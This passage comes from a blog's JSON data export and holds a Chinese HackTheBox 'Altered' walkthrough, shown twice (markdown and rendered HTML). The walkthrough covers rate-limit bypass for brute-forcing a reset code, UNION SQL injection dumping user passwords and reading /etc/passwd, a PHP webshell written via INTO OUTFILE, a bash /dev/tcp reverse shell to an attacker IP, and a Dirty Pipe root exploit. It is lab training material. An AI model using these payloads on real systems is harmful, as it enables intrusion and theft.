联系我\n\n**WeChat**：hl_lhcq\n\n**邮箱**：1370227996@qq.com\n\n","updated":"2021-12-25T12:19:50.097Z","path":"about/index.html","comments":1,"layout":"page","_id":"cl5up2ny30000wku1cgkqcnr6","content":"<h3 id=\"个人简介\"><a href=\"#个人简介\" class=\"headerlink\" title=\"个人简介\"></a>个人简介</h3><p><em>colind0pe</em>,</p>\n<p>网络空间安全专业本科在读，目前从事安全方面的实习工作</p>\n<h3 id=\"联系我\"><a href=\"#联系我\" class=\"headerlink\" title=\"联系我\"></a>联系我</h3><p><strong>WeChat</strong>：hl_lhcq</p>\n<p><strong>邮箱</strong>：<a href=\"mailto:&#49;&#51;&#55;&#x30;&#50;&#50;&#x37;&#x39;&#x39;&#54;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;\">&#49;&#51;&#55;&#x30;&#50;&#50;&#x37;&#x39;&#x39;&#54;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"个人简介\"><a href=\"#个人简介\" class=\"headerlink\" title=\"个人简介\"></a>个人简介</h3><p><em>colind0pe</em>,</p>\n<p>网络空间安全专业本科在读，目前从事安全方面的实习工作</p>\n<h3 id=\"联系我\"><a href=\"#联系我\" class=\"headerlink\" title=\"联系我\"></a>联系我</h3><p><strong>WeChat</strong>：hl_lhcq</p>\n<p><strong>邮箱</strong>：<a href=\"mailto:&#49;&#51;&#55;&#x30;&#50;&#50;&#x37;&#x39;&#x39;&#54;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;\">&#49;&#51;&#55;&#x30;&#50;&#50;&#x37;&#x39;&#x39;&#54;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a></p>\n"}],"Post":[{"title":"HackTheBox-Altered","date":"2022-04-08T01:09:00.000Z","_content":"\n## 实验环境\n\n![](https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png)\n\n## 寻找立足点\n\n### 端口扫描\n\n先对靶机进行端口扫描，发现只开放了22和80端口\n\n```\nnmap -sS -sCV -T4 10.10.11.159 -o ports.nmap\n```\n\n![](https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png)\n\n### 登陆界面攻击面测试\n\n访问80端口，是一个登录界面，先尝试登录\n\n![](https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png)\n\n发现当输入账号为`test`时返回用`无效用户名`，当输入用户名为`admin`时返回`密码无效`，存在用户名枚举\n\n![](https://s2.loli.net/2022/04/06/8hD4NMympbxWoJC.png)\n\n![](https://s2.loli.net/2022/04/06/Af4d8KuVGgWlUjQ.png)\n\n还有一个`忘记密码`的功能，试试能不能修改`admin`的密码，发现需要填写验证码。\n\n接下来有两种思路，爆破密码和爆破验证码，但是密码的位数和强度都是未知的，而验证码只有四位，并且看这个提示，应该是四位的纯数字，这样的话爆破难度还是比较低的，所以我选择爆破验证码。\n\n![](https://s2.loli.net/2022/04/06/rJcPFKaNYfMEtpO.png)\n\n### 验证码爆破\n\n接下来尝试抓包对验证码进行爆破\n\n![](https://s2.loli.net/2022/04/06/16DFxnKtvHB82Tw.png)\n\n标记要爆破的参数\n\n![](https://s2.loli.net/2022/04/06/5sAge31tYRUXavB.png)\n\n设置payload\n\n![](https://s2.loli.net/2022/04/06/ShmXdWYsbBItiLu.png)\n\n爆破了一会后，状态码就从`200`变成了`429`，应该是出现错误了\n\n![](https://s2.loli.net/2022/04/06/TDmEo8Gj3Z5KOia.png)\n\n提示了错误信息，可能是爆破请求频繁导致被禁止访问了\n\n![](https://s2.loli.net/2022/04/06/CQr8WHpBP2OfXVl.png)\n\n![](https://s2.loli.net/2022/04/06/6tmigz1IkT5ZSc7.png)\n\n### 请求次数限制绕过\n\n按照[Bypass Rate Limit](https://www.securecyberfuture.com/post/bypass-rate-limit)的方法尝试绕过访问限制，添加`X-Forwarded-For`字段，返回状态码`200`\n\n![](https://s2.loli.net/2022/04/06/vsTiU29mBZuf78e.png)\n\n再次进行爆破，这次要标记两个值，一个是IP地址，一个是验证码，设置好后开始爆破\n\n![](https://s2.loli.net/2022/04/07/fnCuAOzq4LPxYFX.png)\n\n![](https://s2.loli.net/2022/04/07/bHDNmKfyr9luto8.png)\n\n![](https://s2.loli.net/2022/04/07/o1JzvOMdp8ebmgN.png)\n\n等待了几分钟后，成功爆破出了验证码\n\n![](https://s2.loli.net/2022/04/07/lKakyxL9cw3ZRWs.png)\n\n使用验证码修改了`admin`的密码后登录，跳转到了用户列表\n\n![](https://s2.loli.net/2022/04/07/38MBik7CpZmQyxg.png)\n\n点击用户栏的`View`会在上方显示出用户的信息\n\n![](https://s2.loli.net/2022/04/07/3bslipU7V8yFWCg.png)\n\n### PHP弱类型\n\n抓包查看一下\n\n![](https://s2.loli.net/2022/04/08/wis5IJXNadpbqKO.png)\n\n将请求方式更改为POST，看一下会返回什么。提示不支持POST\n\n![](https://s2.loli.net/2022/04/07/fmPeu5sCd2KVJko.png)\n\n然后试试用POST的请求方式，但将POST改为GET。返回了一些`JSON`格式的信息\n\n![](https://s2.loli.net/2022/04/08/osU2tT1lKNLfinp.png)\n\n那我们也将请求内容改为`JSON`格式试试。如下，返回正常了\n\n![](https://s2.loli.net/2022/04/07/Z9k7H43nifCKPFE.png)\n\n上面的`cookie`可以看到有`laravel_session`的字段，这个站点是使用的`Laravel`框架，而`Laravel`是一款`PHP`Web开发框架\n\n参考文章[PHP弱类型](https://www.freebuf.com/articles/web/323834.html)，将`secret`的值改为`bool`类型的`true`，任意的`id`的值都能返回正常\n\n![](https://s2.loli.net/2022/04/07/PvloBYVWMgGhixk.png)\n\n![](https://s2.loli.net/2022/04/07/7WPRVgbFexktGqc.png)\n\n### SQL注入测试\n\n接着对`id`进行测试，发现添加一个`单引号`，返回`服务器错误`，很明显的`SQL注入`的特征\n\n![](https://s2.loli.net/2022/04/07/Waf4CUv9jr3BiLH.png)\n\n接下来试`SQL注入`，先通过`order by`判断字段数，当为`3`时返回正常，`4`时返回错误，因此字段数为`3`\n\n![](https://s2.loli.net/2022/04/07/YuOMwn6XZTiK7sj.png)\n\n![](https://s2.loli.net/2022/04/07/ydubUGQXFn34a9q.png)\n\n接下来通过`union select`查看回显的位置\n\n![](https://s2.loli.net/2022/04/07/4FrBCcIWmvjhlSp.png)\n\n将`3`的位置替换为SQL语句可以成功执行\n\n![](https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png)\n\n先爆出所有数据库名\n\n```mysql\n-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -\n```\n\n![](https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png)\n\n爆出所有表名和列名\n\n```mysql\n-2 union select 1,2,group_concat('\\n',table_name,':',column_name) from information_schema.columns where table_schema='uhc'-- -\n```\n\n![](https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png)\n\n爆出`users`表的内容\n\n```sql\n-2 union select 1,2,group_concat('\\n',name,':',password) from uhc.users-- -\n```\n\n![](https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png)\n\n但是我们已经有`admin`的密码了，所以这些内容对我们没有什么帮助。接下来看看注入点能不能读取文件，如下图，成功读到了`/etc/passwd`文件\n\n```mysql\n-2 union select 1,2,load_file('/etc/passwd')-- -\n```\n\n![](https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png)\n\n接下来的思路是通过`SQL注入`往站点写`shell`，来获得服务器权限，但是先要知道站点的真实路径\n\n### SQL注入写shell\n\n在最开始的端口扫描中可以看到，该站点使用了`Nginx`作为中间件，我们可以读取`Nginx`的站点配置文件，来查看配置的站点根目录。尝试读取`Nginx`的站点配置文件的默认路径\n\n```sql\n-2 union select 1,2,load_file('/etc/nginx/sites-enabled/default')-- -\n```\n\n![](https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png)\n\n如上图，在该配置文件中存在网站根目录的路径，之后我们就可以往这个路径写`shell`，来得到服务器的初步控制权\n\n通过`into outfile`向网站根目录写入`0.php`，返回`服务器错误`，但是不影响\n\n```sql\n-2 union select 1,2,'<?=`$_GET[1]`?>' into outfile'/srv/altered/public/0.php'-- -\n```\n\n![](https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png)\n\n访问我们的`shell`，能成功执行系统命令\n\n![](https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png)\n\n## 权限提升\n\n### 反弹shell\n\n通过我们写入的`webshell`，反弹一个`shell`回来，翻遍后续的操作\n\n```\nbash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'\n```\n\n![](https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png)\n\n![](https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png)\n\n本地开启的监听接收到了反弹`shell`\n\n通过以下命令，将反弹回来的`shell`升级为完全交互式的`shell`\n\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nctrl+z\nstty raw -echo; fg\nreset\nxterm\n```\n\n![](https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png)\n\n### Dirty Pipe提权漏洞\n\n查看系统的版本为`5.16`\n\n![](https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png)\n\n前段时间刚爆出了一个Linux的提权漏洞`Dirty Pipe`，看了一下[The Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/#the-dirty-pipe-vulnerability)的影响范围：\n\n- version > 5.8\n- version < 5.16.11、5.15.25、5.10.102\n\n![](https://s2.loli.net/2022/04/07/qmCM3tDyNL9c4Zz.png)\n\n这台靶机服务器的版本在影响范围内，所以我们可以直接下载`exploit`并编译，上传到靶机中执行，来获得`root`权限\n\n现在攻击机下载[DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)，并编译。因为攻击机和靶机的Linux版本不一样，所以使用`-fPIC -static`参数进行编译，防止因编译环境不一致导致`exploit`运行出现问题\n\n![](https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png)\n\n```\nwget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c\n\ngcc exploit-2.c -o exp -fPIC -static \n```\n\n在攻击机用`python`起一个简易的服务器\n\n```\npython3 -m http.server 80\n```\n\n![](https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png)\n\n在靶机下载，并赋予执行权限\n\n```\nwget 10.10.16.6/exp\n\nchmod +x ./exp\n```\n\n按照`exploit`作者的使用方法，执行`exploit`劫持`SUID`成功提升至`root`权限\n\n![](https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png)\n\n![](https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png)\n","source":"_posts/HackTheBox-Altered.md","raw":"---\ntitle: HackTheBox-Altered\ndate: 2022-04-08 09:09:00\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![](https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png)\n\n## 寻找立足点\n\n### 端口扫描\n\n先对靶机进行端口扫描，发现只开放了22和80端口\n\n```\nnmap -sS -sCV -T4 10.10.11.159 -o ports.nmap\n```\n\n![](https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png)\n\n### 登陆界面攻击面测试\n\n访问80端口，是一个登录界面，先尝试登录\n\n![](https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png)\n\n发现当输入账号为`test`时返回用`无效用户名`，当输入用户名为`admin`时返回`密码无效`，存在用户名枚举\n\n![](https://s2.loli.net/2022/04/06/8hD4NMympbxWoJC.png)\n\n![](https://s2.loli.net/2022/04/06/Af4d8KuVGgWlUjQ.png)\n\n还有一个`忘记密码`的功能，试试能不能修改`admin`的密码，发现需要填写验证码。\n\n接下来有两种思路，爆破密码和爆破验证码，但是密码的位数和强度都是未知的，而验证码只有四位，并且看这个提示，应该是四位的纯数字，这样的话爆破难度还是比较低的，所以我选择爆破验证码。\n\n![](https://s2.loli.net/2022/04/06/rJcPFKaNYfMEtpO.png)\n\n### 验证码爆破\n\n接下来尝试抓包对验证码进行爆破\n\n![](https://s2.loli.net/2022/04/06/16DFxnKtvHB82Tw.png)\n\n标记要爆破的参数\n\n![](https://s2.loli.net/2022/04/06/5sAge31tYRUXavB.png)\n\n设置payload\n\n![](https://s2.loli.net/2022/04/06/ShmXdWYsbBItiLu.png)\n\n爆破了一会后，状态码就从`200`变成了`429`，应该是出现错误了\n\n![](https://s2.loli.net/2022/04/06/TDmEo8Gj3Z5KOia.png)\n\n提示了错误信息，可能是爆破请求频繁导致被禁止访问了\n\n![](https://s2.loli.net/2022/04/06/CQr8WHpBP2OfXVl.png)\n\n![](https://s2.loli.net/2022/04/06/6tmigz1IkT5ZSc7.png)\n\n### 请求次数限制绕过\n\n按照[Bypass Rate Limit](https://www.securecyberfuture.com/post/bypass-rate-limit)的方法尝试绕过访问限制，添加`X-Forwarded-For`字段，返回状态码`200`\n\n![](https://s2.loli.net/2022/04/06/vsTiU29mBZuf78e.png)\n\n再次进行爆破，这次要标记两个值，一个是IP地址，一个是验证码，设置好后开始爆破\n\n![](https://s2.loli.net/2022/04/07/fnCuAOzq4LPxYFX.png)\n\n![](https://s2.loli.net/2022/04/07/bHDNmKfyr9luto8.png)\n\n![](https://s2.loli.net/2022/04/07/o1JzvOMdp8ebmgN.png)\n\n等待了几分钟后，成功爆破出了验证码\n\n![](https://s2.loli.net/2022/04/07/lKakyxL9cw3ZRWs.png)\n\n使用验证码修改了`admin`的密码后登录，跳转到了用户列表\n\n![](https://s2.loli.net/2022/04/07/38MBik7CpZmQyxg.png)\n\n点击用户栏的`View`会在上方显示出用户的信息\n\n![](https://s2.loli.net/2022/04/07/3bslipU7V8yFWCg.png)\n\n### PHP弱类型\n\n抓包查看一下\n\n![](https://s2.loli.net/2022/04/08/wis5IJXNadpbqKO.png)\n\n将请求方式更改为POST，看一下会返回什么。提示不支持POST\n\n![](https://s2.loli.net/2022/04/07/fmPeu5sCd2KVJko.png)\n\n然后试试用POST的请求方式，但将POST改为GET。返回了一些`JSON`格式的信息\n\n![](https://s2.loli.net/2022/04/08/osU2tT1lKNLfinp.png)\n\n那我们也将请求内容改为`JSON`格式试试。如下，返回正常了\n\n![](https://s2.loli.net/2022/04/07/Z9k7H43nifCKPFE.png)\n\n上面的`cookie`可以看到有`laravel_session`的字段，这个站点是使用的`Laravel`框架，而`Laravel`是一款`PHP`Web开发框架\n\n参考文章[PHP弱类型](https://www.freebuf.com/articles/web/323834.html)，将`secret`的值改为`bool`类型的`true`，任意的`id`的值都能返回正常\n\n![](https://s2.loli.net/2022/04/07/PvloBYVWMgGhixk.png)\n\n![](https://s2.loli.net/2022/04/07/7WPRVgbFexktGqc.png)\n\n### SQL注入测试\n\n接着对`id`进行测试，发现添加一个`单引号`，返回`服务器错误`，很明显的`SQL注入`的特征\n\n![](https://s2.loli.net/2022/04/07/Waf4CUv9jr3BiLH.png)\n\n接下来试`SQL注入`，先通过`order by`判断字段数，当为`3`时返回正常，`4`时返回错误，因此字段数为`3`\n\n![](https://s2.loli.net/2022/04/07/YuOMwn6XZTiK7sj.png)\n\n![](https://s2.loli.net/2022/04/07/ydubUGQXFn34a9q.png)\n\n接下来通过`union select`查看回显的位置\n\n![](https://s2.loli.net/2022/04/07/4FrBCcIWmvjhlSp.png)\n\n将`3`的位置替换为SQL语句可以成功执行\n\n![](https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png)\n\n先爆出所有数据库名\n\n```mysql\n-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -\n```\n\n![](https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png)\n\n爆出所有表名和列名\n\n```mysql\n-2 union select 1,2,group_concat('\\n',table_name,':',column_name) from information_schema.columns where table_schema='uhc'-- -\n```\n\n![](https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png)\n\n爆出`users`表的内容\n\n```sql\n-2 union select 1,2,group_concat('\\n',name,':',password) from uhc.users-- -\n```\n\n![](https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png)\n\n但是我们已经有`admin`的密码了，所以这些内容对我们没有什么帮助。接下来看看注入点能不能读取文件，如下图，成功读到了`/etc/passwd`文件\n\n```mysql\n-2 union select 1,2,load_file('/etc/passwd')-- -\n```\n\n![](https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png)\n\n接下来的思路是通过`SQL注入`往站点写`shell`，来获得服务器权限，但是先要知道站点的真实路径\n\n### SQL注入写shell\n\n在最开始的端口扫描中可以看到，该站点使用了`Nginx`作为中间件，我们可以读取`Nginx`的站点配置文件，来查看配置的站点根目录。尝试读取`Nginx`的站点配置文件的默认路径\n\n```sql\n-2 union select 1,2,load_file('/etc/nginx/sites-enabled/default')-- -\n```\n\n![](https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png)\n\n如上图，在该配置文件中存在网站根目录的路径，之后我们就可以往这个路径写`shell`，来得到服务器的初步控制权\n\n通过`into outfile`向网站根目录写入`0.php`，返回`服务器错误`，但是不影响\n\n```sql\n-2 union select 1,2,'<?=`$_GET[1]`?>' into outfile'/srv/altered/public/0.php'-- -\n```\n\n![](https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png)\n\n访问我们的`shell`，能成功执行系统命令\n\n![](https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png)\n\n## 权限提升\n\n### 反弹shell\n\n通过我们写入的`webshell`，反弹一个`shell`回来，翻遍后续的操作\n\n```\nbash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'\n```\n\n![](https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png)\n\n![](https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png)\n\n本地开启的监听接收到了反弹`shell`\n\n通过以下命令，将反弹回来的`shell`升级为完全交互式的`shell`\n\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nctrl+z\nstty raw -echo; fg\nreset\nxterm\n```\n\n![](https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png)\n\n### Dirty Pipe提权漏洞\n\n查看系统的版本为`5.16`\n\n![](https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png)\n\n前段时间刚爆出了一个Linux的提权漏洞`Dirty Pipe`，看了一下[The Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/#the-dirty-pipe-vulnerability)的影响范围：\n\n- version > 5.8\n- version < 5.16.11、5.15.25、5.10.102\n\n![](https://s2.loli.net/2022/04/07/qmCM3tDyNL9c4Zz.png)\n\n这台靶机服务器的版本在影响范围内，所以我们可以直接下载`exploit`并编译，上传到靶机中执行，来获得`root`权限\n\n现在攻击机下载[DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)，并编译。因为攻击机和靶机的Linux版本不一样，所以使用`-fPIC -static`参数进行编译，防止因编译环境不一致导致`exploit`运行出现问题\n\n![](https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png)\n\n```\nwget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c\n\ngcc exploit-2.c -o exp -fPIC -static \n```\n\n在攻击机用`python`起一个简易的服务器\n\n```\npython3 -m http.server 80\n```\n\n![](https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png)\n\n在靶机下载，并赋予执行权限\n\n```\nwget 10.10.16.6/exp\n\nchmod +x ./exp\n```\n\n按照`exploit`作者的使用方法，执行`exploit`劫持`SUID`成功提升至`root`权限\n\n![](https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png)\n\n![](https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png)\n","slug":"HackTheBox-Altered","published":1,"updated":"2022-04-08T02:03:40.440Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2ny60001wku112am8y1q","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png\"></p>\n<h2 id=\"寻找立足点\"><a href=\"#寻找立足点\" class=\"headerlink\" title=\"寻找立足点\"></a>寻找立足点</h2><h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><p>先对靶机进行端口扫描，发现只开放了22和80端口</p>\n<pre><code>nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png\"></p>\n<h3 id=\"登陆界面攻击面测试\"><a href=\"#登陆界面攻击面测试\" class=\"headerlink\" title=\"登陆界面攻击面测试\"></a>登陆界面攻击面测试</h3><p>访问80端口，是一个登录界面，先尝试登录</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png\"></p>\n<p>发现当输入账号为<code>test</code>时返回用<code>无效用户名</code>，当输入用户名为<code>admin</code>时返回<code>密码无效</code>，存在用户名枚举</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/8hD4NMympbxWoJC.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/06/Af4d8KuVGgWlUjQ.png\"></p>\n<p>还有一个<code>忘记密码</code>的功能，试试能不能修改<code>admin</code>的密码，发现需要填写验证码。</p>\n<p>接下来有两种思路，爆破密码和爆破验证码，但是密码的位数和强度都是未知的，而验证码只有四位，并且看这个提示，应该是四位的纯数字，这样的话爆破难度还是比较低的，所以我选择爆破验证码。</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/rJcPFKaNYfMEtpO.png\"></p>\n<h3 id=\"验证码爆破\"><a href=\"#验证码爆破\" class=\"headerlink\" title=\"验证码爆破\"></a>验证码爆破</h3><p>接下来尝试抓包对验证码进行爆破</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/16DFxnKtvHB82Tw.png\"></p>\n<p>标记要爆破的参数</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/5sAge31tYRUXavB.png\"></p>\n<p>设置payload</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/ShmXdWYsbBItiLu.png\"></p>\n<p>爆破了一会后，状态码就从<code>200</code>变成了<code>429</code>，应该是出现错误了</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/TDmEo8Gj3Z5KOia.png\"></p>\n<p>提示了错误信息，可能是爆破请求频繁导致被禁止访问了</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/CQr8WHpBP2OfXVl.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/06/6tmigz1IkT5ZSc7.png\"></p>\n<h3 id=\"请求次数限制绕过\"><a href=\"#请求次数限制绕过\" class=\"headerlink\" title=\"请求次数限制绕过\"></a>请求次数限制绕过</h3><p>按照<a href=\"https://www.securecyberfuture.com/post/bypass-rate-limit\">Bypass Rate Limit</a>的方法尝试绕过访问限制，添加<code>X-Forwarded-For</code>字段，返回状态码<code>200</code></p>\n<p><img src=\"https://s2.loli.net/2022/04/06/vsTiU29mBZuf78e.png\"></p>\n<p>再次进行爆破，这次要标记两个值，一个是IP地址，一个是验证码，设置好后开始爆破</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/fnCuAOzq4LPxYFX.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/bHDNmKfyr9luto8.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/o1JzvOMdp8ebmgN.png\"></p>\n<p>等待了几分钟后，成功爆破出了验证码</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/lKakyxL9cw3ZRWs.png\"></p>\n<p>使用验证码修改了<code>admin</code>的密码后登录，跳转到了用户列表</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/38MBik7CpZmQyxg.png\"></p>\n<p>点击用户栏的<code>View</code>会在上方显示出用户的信息</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/3bslipU7V8yFWCg.png\"></p>\n<h3 id=\"PHP弱类型\"><a href=\"#PHP弱类型\" class=\"headerlink\" title=\"PHP弱类型\"></a>PHP弱类型</h3><p>抓包查看一下</p>\n<p><img src=\"https://s2.loli.net/2022/04/08/wis5IJXNadpbqKO.png\"></p>\n<p>将请求方式更改为POST，看一下会返回什么。提示不支持POST</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/fmPeu5sCd2KVJko.png\"></p>\n<p>然后试试用POST的请求方式，但将POST改为GET。返回了一些<code>JSON</code>格式的信息</p>\n<p><img src=\"https://s2.loli.net/2022/04/08/osU2tT1lKNLfinp.png\"></p>\n<p>那我们也将请求内容改为<code>JSON</code>格式试试。如下，返回正常了</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/Z9k7H43nifCKPFE.png\"></p>\n<p>上面的<code>cookie</code>可以看到有<code>laravel_session</code>的字段，这个站点是使用的<code>Laravel</code>框架，而<code>Laravel</code>是一款<code>PHP</code>Web开发框架</p>\n<p>参考文章<a href=\"https://www.freebuf.com/articles/web/323834.html\">PHP弱类型</a>，将<code>secret</code>的值改为<code>bool</code>类型的<code>true</code>，任意的<code>id</code>的值都能返回正常</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/PvloBYVWMgGhixk.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/7WPRVgbFexktGqc.png\"></p>\n<h3 id=\"SQL注入测试\"><a href=\"#SQL注入测试\" class=\"headerlink\" title=\"SQL注入测试\"></a>SQL注入测试</h3><p>接着对<code>id</code>进行测试，发现添加一个<code>单引号</code>，返回<code>服务器错误</code>，很明显的<code>SQL注入</code>的特征</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/Waf4CUv9jr3BiLH.png\"></p>\n<p>接下来试<code>SQL注入</code>，先通过<code>order by</code>判断字段数，当为<code>3</code>时返回正常，<code>4</code>时返回错误，因此字段数为<code>3</code></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/YuOMwn6XZTiK7sj.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/ydubUGQXFn34a9q.png\"></p>\n<p>接下来通过<code>union select</code>查看回显的位置</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/4FrBCcIWmvjhlSp.png\"></p>\n<p>将<code>3</code>的位置替换为SQL语句可以成功执行</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png\"></p>\n<p>先爆出所有数据库名</p>\n<pre><code class=\"mysql\">-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png\"></p>\n<p>爆出所有表名和列名</p>\n<pre><code class=\"mysql\">-2 union select 1,2,group_concat(&#39;\\n&#39;,table_name,&#39;:&#39;,column_name) from information_schema.columns where table_schema=&#39;uhc&#39;-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png\"></p>\n<p>爆出<code>users</code>表的内容</p>\n<pre><code class=\"sql\">-2 union select 1,2,group_concat(&#39;\\n&#39;,name,&#39;:&#39;,password) from uhc.users-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png\"></p>\n<p>但是我们已经有<code>admin</code>的密码了，所以这些内容对我们没有什么帮助。接下来看看注入点能不能读取文件，如下图，成功读到了<code>/etc/passwd</code>文件</p>\n<pre><code class=\"mysql\">-2 union select 1,2,load_file(&#39;/etc/passwd&#39;)-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png\"></p>\n<p>接下来的思路是通过<code>SQL注入</code>往站点写<code>shell</code>，来获得服务器权限，但是先要知道站点的真实路径</p>\n<h3 id=\"SQL注入写shell\"><a href=\"#SQL注入写shell\" class=\"headerlink\" title=\"SQL注入写shell\"></a>SQL注入写shell</h3><p>在最开始的端口扫描中可以看到，该站点使用了<code>Nginx</code>作为中间件，我们可以读取<code>Nginx</code>的站点配置文件，来查看配置的站点根目录。尝试读取<code>Nginx</code>的站点配置文件的默认路径</p>\n<pre><code class=\"sql\">-2 union select 1,2,load_file(&#39;/etc/nginx/sites-enabled/default&#39;)-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png\"></p>\n<p>如上图，在该配置文件中存在网站根目录的路径，之后我们就可以往这个路径写<code>shell</code>，来得到服务器的初步控制权</p>\n<p>通过<code>into outfile</code>向网站根目录写入<code>0.php</code>，返回<code>服务器错误</code>，但是不影响</p>\n<pre><code class=\"sql\">-2 union select 1,2,&#39;&lt;?=`$_GET[1]`?&gt;&#39; into outfile&#39;/srv/altered/public/0.php&#39;-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png\"></p>\n<p>访问我们的<code>shell</code>，能成功执行系统命令</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><p>通过我们写入的<code>webshell</code>，反弹一个<code>shell</code>回来，翻遍后续的操作</p>\n<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1&#39;\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png\"></p>\n<p><img 